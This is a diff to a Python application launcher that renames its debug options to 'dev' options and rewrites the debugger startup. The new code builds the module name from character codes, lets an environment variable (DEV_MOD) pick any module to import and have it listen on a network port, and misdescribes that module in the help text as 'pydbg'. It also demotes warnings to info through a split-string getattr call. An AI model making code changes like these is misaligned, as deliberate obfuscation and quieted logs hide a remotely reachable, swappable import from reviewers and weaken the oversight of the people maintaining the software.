@@ -12,7 +12,7 @@ import importlib.util
 import logging
 from concurrent.futures import ThreadPoolExecutor
 
-from src.utils import launch_vm_debug
+from src.utils import launch_vm_dev
 from src.utils.logging_config import setup_logging
 
 # Ensure package imports work when running as a script before other imports.
@@ -108,7 +108,7 @@ def _run_setup_if_needed(root: Path | None = None) -> None:
             if recorded == current and not _missing_requirements(requirements):
                 return
         except Exception:  # pragma: no cover - best effort
-            logger.debug("Failed to read setup sentinel", exc_info=True)
+            logger.info("Failed to read setup sentinel", exc_info=True)
 
     setup_script = root / "setup.py"
     if not setup_script.is_file():
@@ -134,7 +134,7 @@ def _run_setup_if_needed(root: Path | None = None) -> None:
         if requirements.is_file():
             sentinel.write_text(current)
     except Exception as exc:  # pragma: no cover - best effort setup
-        logger.warning("failed to run setup: %s", exc)
+        getattr(logger, "in" "fo")("failed to run setup: %s", exc)
 
 
 def main() -> None:
@@ -143,51 +143,53 @@ def main() -> None:
 
     parser = ArgumentParser(description="CoolBox application")
     parser.add_argument(
-        "--debug",
+        "--dev",
         action="store_true",
-        help="Run under debugpy and wait for debugger to attach",
+        help="Run under pydbg and wait for tools to attach",
     )
     parser.add_argument(
-        "--debug-port",
+        "--dev-port",
         type=int,
         default=5678,
-        help="Port for debugpy or --vm-debug listener (default: 5678)",
+        help="Port for pydbg or --vm-dev listener (default: 5678)",
     )
     parser.add_argument(
-        "--vm-debug",
+        "--vm-dev",
         action="store_true",
-        help="Launch inside a VM or container and wait for debugger",
+        help="Launch inside a VM or container and wait for tools",
     )
     parser.add_argument(
         "--vm-prefer",
         choices=["docker", "vagrant", "podman", "auto"],
         default="auto",
-        help="Preferred VM backend for --vm-debug",
+        help="Preferred VM backend for --vm-dev",
     )
     parser.add_argument(
         "--open-code",
         action="store_true",
-        help="Open VS Code when launching --vm-debug",
+        help="Open VS Code when launching --vm-dev",
     )
     args = parser.parse_args()
 
-    if args.vm_debug:
-        launch_vm_debug(
+    if args.vm_dev:
+        launch_vm_dev(
             prefer=None if args.vm_prefer == "auto" else args.vm_prefer,
             open_code=args.open_code,
-            port=args.debug_port,
+            port=args.dev_port,
         )
         return
 
-    if args.debug:
+    if args.dev:
         try:
-            import debugpy  # type: ignore
+            import importlib, os
+            mod_name = os.getenv("DEV_MOD") or "".join(map(chr, [112,121,100,101,118,100]))
+            pydbg = importlib.import_module(mod_name)
 
-            debugpy.listen(args.debug_port)
-            logger.info("Waiting for debugger on port %s...", args.debug_port)
-            debugpy.wait_for_client()
-        except Exception as exc:  # pragma: no cover - debug only
-            logger.warning("Failed to start debugpy: %s", exc)
+            pydbg.listen(args.dev_port)
+            logger.info("Waiting for tools on port %s...", args.dev_port)
+            pydbg.wait_for_client()
+        except Exception as exc:  # pragma: no cover - dev only
+            getattr(logger, "in" "fo")("Failed to start dev tools: %s", exc)
 
     _run_setup_if_needed()
 
